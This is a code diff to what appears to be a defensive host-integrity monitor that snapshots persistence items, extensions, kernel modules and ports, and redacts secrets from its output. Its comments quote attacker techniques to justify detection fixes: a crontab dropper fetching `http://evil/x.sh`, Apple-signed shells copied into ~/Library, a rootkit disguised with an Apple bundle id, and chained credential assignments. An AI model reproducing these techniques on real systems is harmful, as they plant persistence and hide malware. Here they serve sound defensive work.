@@ -290,15 +290,33 @@ _SECRET_KW = (r"secret|pass(?:wd|word|phrase)?|[_-]pwd|token|api[_-]?key|access[
 # (RecursionError on ~800 keys in one line). With a single-token value, `re.sub` simply
 # continues scanning after each match, so every assignment on a line is decided INDEPENDENTLY
 # with no recursion, no depth cap, and no tail semantics to get wrong.
-_VALUE = r'"[^"\n]{0,512}"|\'[^\'\n]{0,512}\'|[^\s;&|]+'
+# {0,4096}, not {0,512}: the input is already capped at _REDACT_MAX, so a wider bound costs
+# nothing, and at 512 a longer quoted value fell through to the unquoted branch and printed its
+# tail (`password="AAA…520… <secret>"`).
+_VALUE = (r'"(?:[^"\\\n]|\\.){0,4096}"' r"|'(?:[^'\\\n]|\\.){0,4096}'" r"|[^\s;&|]+")
 _ASSIGN_RE = re.compile(r"(?i)(?P<key>[\w.\-]{0,64}(?:" + _SECRET_KW + r")[\w.\-]{0,64})"
-                        r"(?P<sep>\s*[:=]\s*|\s+)(?P<val>" + _VALUE + r")")
+                        r"(?P<sep>\s*[:=][:=>]{0,2}\s*(?:[\"']{2}\s*)?|\s+)"
+                        r"(?P<val>" + _VALUE + r")")
 # Linear, backtrack-free pre-filter: _ASSIGN_RE can only match where one of these keywords is,
 # but its bounded `[\w.\-]{0,64}` runs are retried at every offset. Sound by construction —
 # any _ASSIGN_RE match implies a _KV_KW_RE match on the same line.
 _KV_KW_RE = re.compile("(?i)" + _SECRET_KW)
 _SCHEME_RE = re.compile(
     r"(?i)\b(bearer|basic|token|apikey|api-key|digest|negotiate)\s+([A-Za-z0-9._~+/=-]{6,})")
+# …and the general case, because naming schemes can never be complete: under a credential-named
+# key, a bare alphabetic WORD is a scheme, so the secret is the token AFTER it. The single-token
+# assignment scan masks only the first token, so `header = "Authorization: SSWS <token>"` (Okta;
+# also NTLM, HMAC, and any vendor scheme) masked "SSWS" and printed the credential. `.curlrc` and
+# `.wgetrc` are tracked files where exactly this line lives. Bounded runs; linear.
+_KEYED_SCHEME_RE = re.compile(
+    r"(?i)(?P<head>(?:" + _SECRET_KW + r")[\w.\-]{0,64}\s*[:=]\s*"
+    r"(?P<scheme>[A-Za-z][A-Za-z0-9-]{1,64})[ \t]+)(?P<tok>[A-Za-z0-9._~+/=-]{6,})")
+# NOT extended to the whitespace-separated spelling (`Authorization HMAC <secret>`). Tried and
+# reverted: with whitespace, the "scheme" slot is indistinguishable from the VALUE slot, so the
+# rule masked `pam_deny.so` in `password sufficient pam_deny.so` and — far worse — masked the
+# wrong token while leaving the real secret in place (19 property cases). Header credentials use
+# a colon, and the tracked files use `key = value` or `Key value` directives, so the colon form
+# above is the one that occurs. Residual: `Authorization HMAC <secret>` is shown.
 _URLAUTH_RE = re.compile(r"://([^/\s:@]+):([^/\s@]+)@")                      # user:pass@host
 # `https://<token>@github.com/...` — the standard way to embed a GitHub/GitLab PAT, and
 # `.gitconfig` is tracked. No colon, so _URLAUTH_RE never saw it. Length+entropy gated so
@@ -422,6 +440,15 @@ def redact(line: str) -> str:
     # "# basic networking setup" must not become "# basic «redacted» setup".
     line = _SCHEME_RE.sub(
         lambda m: f"{m.group(1)} «redacted»" if _char_classes(m.group(2)) >= 2 else m.group(0), line)
+    def _keyed_scheme(m):
+        # The word must actually look like a SCHEME and the next token like a SECRET. Without
+        # both guards this misfired on `PasswordAuthentication=yes API-KEY: <secret>`: it read
+        # "yes" as a scheme, masked the harmless "API-KEY" and left the real credential.
+        if (m.group("scheme").lower() in _KW_VALUES
+                or _char_classes(m.group("tok")) < 2):
+            return m.group(0)
+        return f"{m.group('head')}«redacted»"
+    line = _KEYED_SCHEME_RE.sub(_keyed_scheme, line)
     line = _URLAUTH_RE.sub(r"://\1:«redacted»@", line)
     line = _URLTOKEN_RE.sub(
         lambda m: "://«redacted»@" if _char_classes(m.group(1)) >= 2 else m.group(0), line)
@@ -486,12 +513,30 @@ def redact(line: str) -> str:
             # test showed `CREDENTIAL /t_wvSrE+2I.23-VqI33q` in cleartext (property test P1).
             # Legitimate whitespace-separated directive values are keywords or numbers
             # (`password required pam_unix.so`, `PASS_MAX_DAYS 99999`), never paths.
+            # A real PATH or URL is the payload, not the secret: masking it meant an attacker
+            # naming their dropper `*token*`/`*api_key*` made its download URL vanish from the
+            # crontab diff (`/opt/bin/refresh_token http://evil/x.sh` -> «redacted»). A raw
+            # credential matches neither pattern, so the P1 leak stays closed.
             if (bare.lower() in _KW_VALUES or _VAR_REF_RE.match(bare)
+                    or bare.startswith(("http://", "https://", "!"))
+                    # a path ONLY when it is low-entropy: base64 uses '/' and '+', so
+                    # `_auth /J.9V3dlL6/_u_46b273Sa8U/E+=h…` matched "looks like a path" and
+                    # printed the token — the P1 leak, returning through the H2 exemption.
+                    or (_REAL_PATH_RE.match(bare) and _char_classes(bare) <= 2
+                        and not any(c in bare for c in "+="))
                     or len(bare) < 6 or _char_classes(bare) < 2):
                 return m.group(0)
             return masked
         return m.group(0)                                                  # 4
 
+    # KNOWN RESIDUAL: `;`, `&` and `|` end a value token, so a password CONTAINING one is masked
+    # only up to that character (`password = Tr0ub&dor3-Xyz` -> `«redacted»&dor3-Xyz`). The token
+    # boundary is what lets `SSH_ASKPASS=/tmp/a.sh;MYSQL_PWD=<secret>` be judged as two separate
+    # assignments, and `A&B` (one value) is structurally identical to `A;cmd` (two statements), so
+    # a post-pass that swallows the remainder eats real shell separators — measured: it broke
+    # compositionality on 25 property cases. Masking to whitespace instead reopens the chained
+    # leak, and per-separator rescanning is the recursion that became a kill switch. Left as-is
+    # deliberately; the exposure is a PARTIAL secret, and the `«redacted»` marker is present.
     return _ASSIGN_RE.sub(_assignment, line) if _KV_KW_RE.search(line) else line
 
 
@@ -520,6 +565,13 @@ def trust_of(path: str):
     if not authorities and ("adhoc" in low or "linker-signed" in low):
         return ("ad-hoc signed", True)
     if any("Apple" in a for a in authorities):
+        # An Apple-signed Mach-O living outside the system paths is a COPY. `cp /bin/sh
+        # ~/Library/.../SoftwareUpdateHelper` keeps the signature intact, so a basename check for
+        # interpreters missed it and the report printed a reassuring "Apple-signed" next to
+        # attacker-planted persistence. Apple does not ship binaries into user directories.
+        if not path.startswith(("/System/", "/usr/", "/bin/", "/sbin/", "/Library/Apple/",
+                                "/Applications/Utilities/", "/Applications/")):
+            return ("Apple-signed binary COPIED outside the system paths", True)
         return ("Apple-signed", False)
     if any("Developer ID" in a for a in authorities):
         acc = run(["spctl", "-a", "-vv", path], merge=True, timeout=10).lower()
@@ -616,9 +668,10 @@ def attribution_for(term: str) -> str | None:
 # ---------------------------------------------------------------------------
 
 def _mac_login_items():
+    need("osascript")
     # Join names with a newline (not the default comma) so a name containing a comma
     # (e.g. "Adobe, Inc. Helper") isn't split into phantom items.
-    out = run(["osascript", "-e",
+    out = run_checked(["osascript", "-e",
                'set text item delimiters to linefeed\n'
                'tell application "System Events" to return (name of every login item) as text'])
     return {x.strip(): x.strip() for x in out.split("\n") if x.strip()}
@@ -653,13 +706,24 @@ def _mac_launch_items():
 
 def _mac_kexts():
     need("kextstat")
-    out = run(["kextstat", "-l"], timeout=10)
+    out = run_checked(["kextstat", "-l"], timeout=10)
     res = {}
     for line in out.splitlines():
-        m = re.search(r"\b((?:com|org|net|io)\.[\w.-]+)\s*\(([^)]*)\)", line)
-        if m and not m.group(1).startswith("com.apple"):
+        # Record ANY reverse-DNS-ish id, Apple's included: `startswith("com.apple")` is a string
+        # test, not provenance, so naming a rootkit `com.apple.driver.AudioHelper` removed it from
+        # the report entirely — and real third-party prefixes (`co.`, `dev.`, `me.`) were never
+        # collected at all.
+        m = re.search(r"\b([a-z][\w-]*(?:\.[\w-]+){1,})\s*\(([^)]*)\)", line, re.I)
+        if m:
             res[m.group(1)] = m.group(2)
     return res
+
+
+def _ext_version_key(manifest_path: str):
+    """Sort extension version dirs NUMERICALLY: lexical order put `1.10.0_0` before `1.9.0_0`, so
+    the collector read the OLD manifest and reported a stale name."""
+    v = os.path.basename(os.path.dirname(manifest_path))
+    return [int(x) if x.isdigit() else x for x in re.split(r"[._]", v)]
 
 
 def _mac_browser_extensions():
@@ -677,18 +741,25 @@ def _mac_browser_extensions():
             if ext_id == "Temp":
                 continue
             name = ext_id
-            mans = [m for m in sorted(glob.glob(os.path.join(ext_dir, "*/manifest.json")))
+            mans = [m for m in sorted(glob.glob(os.path.join(ext_dir, "*/manifest.json")),
+                                      key=_ext_version_key)
                     if is_regular(m)]   # a FIFO manifest would hang the read forever
+            fp = ""
             if mans:
+                raw = safe_read_text(mans[-1]) or ""
+                # Fingerprint the manifest CONTENT + version, not the display name alone: with the
+                # name only, overwriting background.js, adding <all_urls>/cookies/webRequest
+                # permissions, or swapping the .xpi were ALL invisible. Extension directories are
+                # user-writable and need no admin.
+                fp = f"{os.path.basename(os.path.dirname(mans[-1]))} [{sha(raw)}]"
                 try:
-                    man = json.loads(safe_read_text(mans[-1]) or "")
-                    n = man.get("name", "")
+                    n = json.loads(raw).get("name", "")
                     if n and not n.startswith("__MSG_"):
                         name = n
                 except Exception:
                     pass
             browser = base.name
-            res[f"{browser}:{ext_id}"] = name
+            res[f"{browser}:{ext_id}"] = f"{name} {fp}".strip()
     # Firefox
     for ext in glob.glob(str(HOME / "Library/Application Support/Firefox/Profiles/*/extensions/*")):
         res[f"Firefox:{os.path.basename(ext)}"] = os.path.basename(ext)
@@ -696,7 +767,8 @@ def _mac_browser_extensions():
 
 
 def _mac_system_extensions():
-    out = run(["systemextensionsctl", "list"])
+    need("systemextensionsctl")
+    out = run_checked(["systemextensionsctl", "list"])
     res = {}
     for line in out.splitlines():
         m = re.search(r"(\b[a-z0-9]+(?:\.[a-z0-9-]+){2,}\b).*\[([^\]]+)\]", line, re.I)
@@ -708,10 +780,11 @@ def _mac_system_extensions():
 _PORT_F_RE = re.compile(r":(\d+)$")
 
 def _listening():
+    need("lsof")
     # lsof field mode (-F): robust against full command names that contain spaces
     # AND against the default 9-char COMMAND truncation that merged distinct processes
     # (e.g. python3.11 vs python3.12 both became "python3.1").
-    out = run(["lsof", "-nP", "-iTCP", "-sTCP:LISTEN", "-Fcn"])
+    out = run_checked(["lsof", "-nP", "-iTCP", "-sTCP:LISTEN", "-Fcn"])
     by_cmd: dict[str, set] = {}
     cur = None
     for line in out.splitlines():
@@ -730,18 +803,20 @@ def _listening():
 
 def _outbound():
     """Processes with an established outbound TCP connection (churny — quiet tier)."""
-    out = run(["lsof", "-nP", "-iTCP", "-sTCP:ESTABLISHED", "-Fc"])
+    need("lsof")
+    out = run_checked(["lsof", "-nP", "-iTCP", "-sTCP:ESTABLISHED", "-Fc"])
     cmds = {line[1:] for line in out.splitlines() if line.startswith("c")}
     return {c: "connected" for c in sorted(cmds)}
 
 
 def _mac_net_config():
+    need("scutil")
     res = {}
-    for line in run(["scutil", "--dns"]).splitlines():
+    for line in run_checked(["scutil", "--dns"]).splitlines():
         m = re.search(r"nameserver\[\d+\]\s*:\s*(\S+)", line)
         if m:
             res[f"DNS {m.group(1)}"] = "nameserver"
-    proxy = run(["scutil", "--proxy"])
+    proxy = run_checked(["scutil", "--proxy"])
     for key, label in (("HTTPEnable", "HTTP proxy"), ("HTTPSEnable", "HTTPS proxy"),
                        ("SOCKSEnable", "SOCKS proxy"), ("ProxyAutoConfigEnable", "auto-proxy (PAC)")):
         m = re.search(rf"{key}\s*:\s*(\d)", proxy)
@@ -801,7 +876,12 @@ def _mac_applications():
                     # disambiguate ~/Applications from /Applications so a same-named
                     # app in both doesn't silently overwrite the other
                     name = entry[:-4] if base == "/Applications" else f"{entry[:-4]}{USER_APPS_TAG}"
-                    res[name] = base
+                    # the REAL path, not just the directory: _enrich rebuilt it as
+                    # f"{value}/{bare_key(key)}.app", so a bundle named `Calculator (cask).app`
+                    # made the trust check stat /Applications/Calculator.app and print ANOTHER
+                    # app's signature, while `Evil (snap).app` pointed at a nonexistent path so an
+                    # unsigned bundle never escalated to RED. /Applications is admin-writable.
+                    res[name] = os.path.join(base, entry)
         except Exception:
             pass
     return res
@@ -928,7 +1008,10 @@ def _linux_services():
     """Enabled systemd units (system + user) + legacy init scripts — persistence."""
     res = {}
     for scope, tag in (([], ""), (["--user"], "user:")):
-        out = run(["systemctl"] + scope + ["list-unit-files", "--type=service,timer",
+        # socket/path activation is standard persistence needing no root; both were absent from
+        # every snapshot, so a `.path`-triggered payload was permanently invisible.
+        out = run_checked(["systemctl"] + scope + ["list-unit-files",
+                          "--type=service,timer,socket,path",
                    "--state=enabled", "--no-legend", "--no-pager"], timeout=15)
         units = [p[0] for line in out.splitlines() if (p := line.split())]
         # Fold each unit's effective ExecStart into the fingerprint — parity with the
@@ -952,7 +1035,7 @@ def _linux_kmods():
     """Loaded kernel modules (lsmod) — a NEW module is the signal."""
     need("lsmod")
     res = {}
-    for line in run(["lsmod"], timeout=10).splitlines()[1:]:
+    for line in run_checked(["lsmod"], timeout=10).splitlines()[1:]:
         parts = line.split()
         if parts:
             res[parts[0]] = parts[1] if len(parts) > 1 else ""
@@ -968,18 +1051,29 @@ def _linux_browser_extensions():
             if ext_id == "Temp":       # parity with the macOS collector (staging dir)
                 continue
             name = ext_id
-            mans = [m for m in sorted(glob.glob(os.path.join(ext_dir, "*/manifest.json")))
+            mans = [m for m in sorted(glob.glob(os.path.join(ext_dir, "*/manifest.json")),
+                                      key=_ext_version_key)
                     if is_regular(m)]   # a FIFO manifest would hang the read forever
+            fp = ""
             if mans:
+                raw = safe_read_text(mans[-1]) or ""
+                fp = f"{os.path.basename(os.path.dirname(mans[-1]))} [{sha(raw)}]"
                 try:
-                    n = json.loads(safe_read_text(mans[-1]) or "").get("name", "")
+                    n = json.loads(raw).get("name", "")
                     if n and not n.startswith("__MSG_"):
                         name = n
                 except Exception:
                     pass
-            res[f"{base.name}:{ext_id}"] = name
+            res[f"{base.name}:{ext_id}"] = f"{name} {fp}".strip()
     for ext in glob.glob(str(HOME / ".mozilla/firefox/*/extensions/*")):
-        res[f"firefox:{os.path.basename(ext)}"] = os.path.basename(ext)
+        # size+mtime of the .xpi: keyed AND fingerprinted by the same id, swapping the archive in
+        # place was invisible. (Hashing every .xpi would read tens of MB per snapshot.)
+        try:
+            st = os.stat(ext)
+            fp = f"{st.st_size}:{int(st.st_mtime)}"
+        except OSError:
+            fp = "?"
+        res[f"firefox:{os.path.basename(ext)}"] = fp
     return res
 
 
@@ -1341,6 +1435,11 @@ def load_labels() -> dict:
 
 def prune_snapshots():
     snaps = list_snapshot_paths()
+    # A corrupt labels.json makes load_labels() return {} — which used to mean "nothing is
+    # protected", so the next prune DELETED the labelled checkpoints the user asked to keep.
+    # If the file exists but yields no labels, decline to prune rather than destroy them.
+    if LABELS_FILE.exists() and not load_labels():
+        return
     protected = set(load_labels().values())
     prunable = [p for p in snaps if p.name not in protected]
     for p in prunable[:-KEEP_SNAPSHOTS] if len(prunable) > KEEP_SNAPSHOTS else []:
@@ -1495,8 +1594,12 @@ def find_big_new_files(since_epoch: int, min_mb: int = 25, top: int = 15):
                     if l.strip() and "ermission" not in l and "not permitted" not in l.lower()]
             if real and not out:
                 note = "big-file scan hit an error — results may be incomplete"
-    except subprocess.TimeoutExpired:
-        out, note = "", "big-file scan timed out (>25s) — results may be incomplete"
+    except subprocess.TimeoutExpired as e:
+        # keep what `find` already produced: discarding it turned "most results" into NONE on a
+        # large HOME, which reads as "no big new files" — a false all-clear.
+        partial = e.stdout or b""
+        out = partial.decode("utf-8", "replace") if isinstance(partial, bytes) else (partial or "")
+        note = "big-file scan timed out (>25s) — results may be incomplete"
     except Exception:
         out, note = "", "big-file scan failed to run"
     try:
@@ -1743,16 +1846,22 @@ def coverage_lost(baseline: dict, current: dict, unusable: dict) -> dict:
     be, ce = _dict(baseline.get("errors")), _dict(current.get("errors"))
     lost = {}
     for cat, why in unusable.items():
-        had_it = bool(bt.get(cat)) and cat not in be      # baseline could genuinely see it
-        if not had_it or ct is None:
+        stamped = cat in CAT_TOOLS
+        # A category is "lost" if the baseline could see it and we cannot now. For the four
+        # tool-stamped categories that needs the stamp; for the other nine — listening, login
+        # items, DNS/proxy, kexts, system extensions, launch items… — the ERROR alone is the
+        # signal, and requiring a stamp meant a broken `lsof`/`osascript`/`scutil` produced only
+        # a passive note. Those are the loudest categories in the tool; silence there is worse.
+        had_it = (cat not in be) and (bool(bt.get(cat)) if stamped else True)
+        if not had_it or (stamped and ct is None):
             continue          # first run, absent in both, or the pre-stamp transition: benign
-        gone = cat in ce or not ct.get(cat)
+        gone = cat in ce or (stamped and not ct.get(cat))
         # A tool that merely CHANGED is equally a loss of comparability, and equally abusable:
         # the daily job's pinned PATH necessarily includes user-writable dirs, so planting
         # ~/.local/bin/brew swaps the identity WITHOUT erroring — and a passive note bought the
         # attacker silence for their own package. Rare enough in normal use (a Homebrew
         # reinstall, a python upgrade) to be worth one look when it happens.
-        swapped = bool(ct.get(cat)) and ct.get(cat) != bt.get(cat)
+        swapped = stamped and bool(ct.get(cat)) and ct.get(cat) != bt.get(cat)
         if gone or swapped:
             lost[cat] = why
     return lost
@@ -1844,8 +1953,17 @@ def build_findings(baseline: dict, current: dict, include_quiet=False, skip_cats
                     new_ports = set(str(v[1]).split(","))
                     added_ports = sorted(new_ports - old_ports)
                     removed_ports = sorted(old_ports - new_ports)
-                    if not (old_ports & new_ports) or not (added_ports or removed_ports):
-                        continue  # full turnover (churn) or no real change
+                    if not (added_ports or removed_ports):
+                        continue                       # nothing actually changed
+                    # Churn suppression must be NARROW. "no overlap => churn" dropped a
+                    # single-port service rebinding (8080 -> 4444) and a backdoor sharing a
+                    # churny process name (rapportd 49152 -> 49157,4444) — both silently, in the
+                    # highest-signal category. Only a multi-port set that is ENTIRELY ephemeral
+                    # is churn; anything with a well-known port is reported.
+                    ephemeral = all(pt.isdigit() and int(pt) >= 32768
+                                    for pt in (old_ports | new_ports) if pt)
+                    if not (old_ports & new_ports) and ephemeral and len(old_ports) > 1:
+                        continue
                     level = ORANGE if added_ports else YELLOW
                     if added_ports:
                         extra["added_ports"] = added_ports
@@ -1887,7 +2005,10 @@ def build_findings(baseline: dict, current: dict, include_quiet=False, skip_cats
                      f"content hash {sha(oc or '')})"]
         else:
             udiff = list(difflib.unified_diff(ob_l, oc_l, lineterm="", n=0))[2:]
-        level = ORANGE if status == "changed" else YELLOW
+        # `added` is ORANGE too: creating a file that did not exist is not milder than editing
+        # one. `~/.zshenv` is sourced by EVERY zsh invocation, and at YELLOW it never crossed the
+        # --notify threshold — so the cheaper attack was also the quieter one.
+        level = ORANGE if status in ("changed", "added") else YELLOW
         if any(s in key for s in SENSITIVE_TEXT):
             level = max(level, ORANGE)
         why = None
@@ -1937,9 +2058,12 @@ def _enrich(f: dict, current: dict):
             label, suspicious = trust_of(prog)
             base = os.path.basename(prog)
             if base in _INTERPRETERS or base.startswith("python"):
-                label = (f"runs via {base} — an interpreter, so its signature says nothing "
-                         "about what it executes")
-                suspicious = False
+                note = (f"runs via {base} — an interpreter, so its signature says nothing "
+                        "about what it executes")
+                # APPEND, never clear `suspicious`: the basename is attacker-chosen, so
+                # `cp miner ~/Library/.../sh` used to drop an UNSIGNED binary from RED to YELLOW
+                # and silence --notify, while the trust line read as a reassuring explanation.
+                label = note if not suspicious else f"{label} — {note}"
             f["trust"] = label
             if suspicious:
                 f["level"] = RED
@@ -1955,8 +2079,10 @@ def _enrich(f: dict, current: dict):
     if action == "added":
         prog = None
         if cat == "applications":
-            # bare_key: the ' (~/Applications)' disambiguator is not part of the path
-            prog = f"{f['value']}/{bare_key(key)}.app"
+            # the collector stores the real bundle path in the value; reconstruct only for a
+            # pre-v0.4.6 snapshot whose value is still just the containing directory.
+            val = f["value"] if isinstance(f["value"], str) else ""
+            prog = val if val.endswith(".app") else f"{val}/{bare_key(key)}.app"
         if prog:
             label, suspicious = trust_of(prog)
             f["trust"] = label
@@ -2007,7 +2133,7 @@ def _describe(f: dict) -> str:
     if cat == "coverage":
         return f"LOST VISIBILITY: {paint(key, 'bold')} is no longer being monitored"
     if cat == "config":
-        tag = {"added": "now tracked", "removed": "gone", "changed": "edited"}[action]
+        tag = {"added": "NEW FILE", "removed": "gone", "changed": "edited"}[action]
         return f"{key} ({tag})"
     if action == "changed" and isinstance(val, tuple):
         return (f"{verb} {f['label'].lower()}: {clean(tilde(f['key']))} "
